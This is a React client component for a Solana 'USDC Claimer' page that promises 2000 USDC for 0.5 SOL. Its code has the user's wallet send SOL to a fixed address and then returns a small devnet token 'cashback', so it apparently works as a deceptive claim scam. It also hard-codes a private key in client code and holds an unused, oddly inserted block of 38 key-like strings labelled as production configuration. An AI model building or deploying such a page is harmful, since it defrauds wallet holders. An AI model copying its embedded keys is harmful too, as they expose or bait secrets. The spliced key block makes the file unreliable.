/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "ELSo7FqqFAbVYeSL9JXrAsqurQdnMnPwPQF5Lkz45u2QgNviRUTnpCnEegXoJfpgkHwC4Sk1gJkSMSfUcFLRenW"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "wt3FnHYqvfsd6tDuH75EjYMRA5DLcNfRV844Q3S9YWtBtz1v1xaCoDef4SyFdhLQN1FNtNqFgPsjKamExevopfw",
  "key1": "3ReuHZDp6arHGh6jw67TyimFr6aVL56DHKBoXaATo5syuVmQ1vMAUzVP35WTzLFXXoU12kGjLy8xkEdqKfupMGBU",
  "key2": "J7wAagiFHaPFgGi5eCUqviuxZ2DHLRr4RuwQUN6Pfc7crwr7Dwa9c97GYctraJ9tevnDs9yxv8r4sTGsk97waYZ",
  "key3": "2r2EmWDGXZXNBtiC5kRCT3rgtdcJtCLu66J4wByvKhKrCLBdBLiTz1GevHjaB6t35Lf1xKMD7X9kQE3X5KL9LYet",
  "key4": "435kFGdRJaYd2oYPH3VDVA52eGx2AmNsprQA64RBW39ykbrfBF9YTEVJjqGVWMf7ywCk888v1G7wEQKrfnE9xN2y",
  "key5": "2mrvtKQ1Vq6egYt8wwKcmzqn534ML82Ze5AjufKAHh6oQy1EynJu4GePKxYcRLn2t6nKp8ftmsziHiwCBCghFzok",
  "key6": "523EnqiLh9Gm6SuKR8i89YwbjGxdBPajetpp4HPCs8XWeZ2zcswUQ1g3HgtC7ykLmLEcWjtSEETVywLBc1sMjKDr",
  "key7": "Cie1mqzCA2YcGQqaDLyKZQo9qPMakmR2vA4atWnLozMn8T9YDymtcDsQeQhENaewLzWrbNW6JUEy1h2AHB4nyX9",
  "key8": "2pGP4Y9XF21UqYmmY8QbwnJJkndr6DNVYLsnykUbLcSWVfEpAP5U4q3nqx8GUMTcpzPzTTEqZdsX41vZkyDFfvmf",
  "key9": "e4F77EjyNdHkGFhi8HGxSu8285udHKKttphxZAcXnPzkcFcc4H58VFRDKekv3YirfPtsGGbTvy7ceiuUC3Ky4bz",
  "key10": "uDBUKSaM3Hs79QXBKiGabQvG9N8iUBjdUPhKgbBda8uvTSRkih8gbGiP4AdSaaNHyCaRrxtJpZkmURtRDornBGa",
  "key11": "2VdPYTD6iUeJRWdukDQAWL7ZdzKXVyqGiKzEWUcxBRA2tkYUCBf4TmU6KXs4sHGfFkfMfvHNwoWP7hhkR3biXMJT",
  "key12": "123wWihwT9QLktTHgQ1WRrEgiUw5dc95wrGNZzajv9yBB1St8QoB6o4WNviryKPb8NULpWJWUN9PEjp2bTerZ1j4",
  "key13": "qXGmNLoaKNTyHvp35b73dpG1uKusyhcs8zRPVteT6zxquuR2pG2hGrFrqhEutstnxhw2YKhDQetG5fGPGBkn1Jy",
  "key14": "5Caste3CexVtbjoWYteZizpFFTb4qZwCxGJUUaVZ4xZARmVyCcW293BfnRNeRSEefCkhMAEj8XdRqivRZtoAKYbZ",
  "key15": "5wX3Ub53wn33ab5oZ1uY7GbVEsvbiYVERu9mZ2NcYXou69R8aPhAqPuX5jLCBwqhg3PtKvksYoufwAptbvCUxkxs",
  "key16": "cedbuTXvGwxqfVtYvfQHaZ6N2SJ3uvzh9RsFyJmk8etqbHdMA8STV1pW6D43x19H59f7NLr4SvN2qrQmBmzZiwA",
  "key17": "31jkW9kwe3irPXwngjkc9iHq9NjLkfU4auS26KLC6Hs2i7Jjse8S8QVjYUrWjooTPUYyXBg76HC6MDn2JeDEFjHi",
  "key18": "2TVBBQ5X57MiCSU2ZkvWWGy2gm4XeX7Tju7og8MaShcSZwV76ze46G8ozNCbQSRtw3QtPkNAF2CBjv7Gtc9ewZ29",
  "key19": "63aXcKQquPWS4bfdtnzGoqXYDBQX5cSp8Vi155vBwVKFTMbTmt7WgcuDfsuS5Ao5PpLTWLUUXaNPUCy2cDMUi75B",
  "key20": "589harJt4AujHcfJoZ8egfGs1i5bGaVx6Rcvwj3AaZdCHZH6ZsVgY7uYxgXqFgvJSvTLSGARfQZw1JnfKTEPzcnb",
  "key21": "4JaDgB1CNUuzcjtdQfywMrMQK17EsuemNReoYUt1PHv34oHp9BURo6P26M6qadFuZoavJSpVJ671KTjWmhvgu83A",
  "key22": "4gvPPAtKV4WXWeDKyYx7D6PUj8xgKmP9CeaedvEJ15MoLsARisQhRwon5MQV1p3TrUo6o5mHEt7F4usAfYK5Aqvc",
  "key23": "3qV6kRRa5agUCL3dCr7beZ24q3F7uis1m2EF9nAFLuaTrd8TuaLw79YmhFnb4HLb5Bmc6KH4ReC5yYJi8sp93CA5",
  "key24": "2f1wzcqMzA3XpBEys5XmpqH9T9dA3q6VvR8uqkUfuYeiZPsWxjff54MbV1RVLekSVWPgw6yZ5u96fNdCyDohd2D",
  "key25": "5JK3r2QpDeAXuz6Mp4e2e2pv53HBaoeeC9Crs8kqEiAo76Pp6RYanvCpFeZQjg8Szw4y46WNCLf2xCFJS6J4XRPo",
  "key26": "5UXRViWje3v2tyEmX1KdfdUPPdCLgBoVutVDeUL2hxMwBx6EShYSxfQAdfLxiTU8SpBfgxvuWcqGPt68kZQs9sy2",
  "key27": "5q6KLENMEJLft2rV1QA7fzVo7yBzhg1TA8mLHEvmQHeEkz3enXEu12jBvBZoJ5KKSKJbZm4srKViLEsFmxephQaW",
  "key28": "4bLwnjLweYXLeMx64JhX3qGzi3BMZ3FQgSsEZxWBxJtyB4v3sbXqUMLjFK1L9JDBfqdLjGwKwQUYK1fmjYLWXT6y",
  "key29": "6geCcknacRUd6M1C7s2EGPYxsPaF4b7N1NPq2jV6Ah9PQBZu5YV3QLCtDVQ2ZR8WVEhS7N7XWi7Pom1B5qDRCLx",
  "key30": "M1PT4sEWi8c8ZEdtT9DsUeX7oCHQxCoyDodLDr9Ts3gv6nMR5aBnXRvhcjuauSw4aeuXuznFcWcoyTSpfcsy3eS",
  "key31": "3TwyFEXA9qfSYRpX3o25nFZUNfYgZAgADvTzYHM7kFNLCBguBPcTGHcfcmiqc6p5ZxtufrwCF429dntp1c22dtn3",
  "key32": "5uSeLJmzai4yts1yYiaszWrYkXHYCMwtVAvRbs9Ujf52ojcG8Qwq9iq2HFWiyS2H6R3d7Lz2vMoun2XcZSWmDN2n",
  "key33": "59ywn4vmAL8PdBmbKCvoA47rkvTxG3NUuqzLcuE7CdHZ8gEcrcS3iuiwHPQ3HJ4ZqyMfTRKm6yaGYvfzxejZX5vN",
  "key34": "ySWvPetw7rGmR2MM33STgJ8PKR5323RJJSyhHpEQXgWhCL2D1SX2qBLpzzptAXyPWPYvBTuAuVHHNhjk6dAahKH",
  "key35": "3U8WWtkxJpssmJsE6z4T4sZNNnqBR2XegynZVk3Pz57pMbr45sDLG7vrtHXjDuAsuura7Az76F5NQAPt6fzZfGa8",
  "key36": "4PEpqfe4sTKsX1o4kz7J2eZxcUZcSjUTiecCboDM4Ebt28tAcEnvqDwqG7JJeHF1REkURjaEqkZjMYCqhXZwX9Mn",
  "key37": "4baUwKuDqsDbHNoE2mZSFVQDPvXLfCwTWn7CJerSU3kRtKRDZiJSZp6fJoCs541s9FJLZDX3kSKrnE5GT4tJjSKE"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
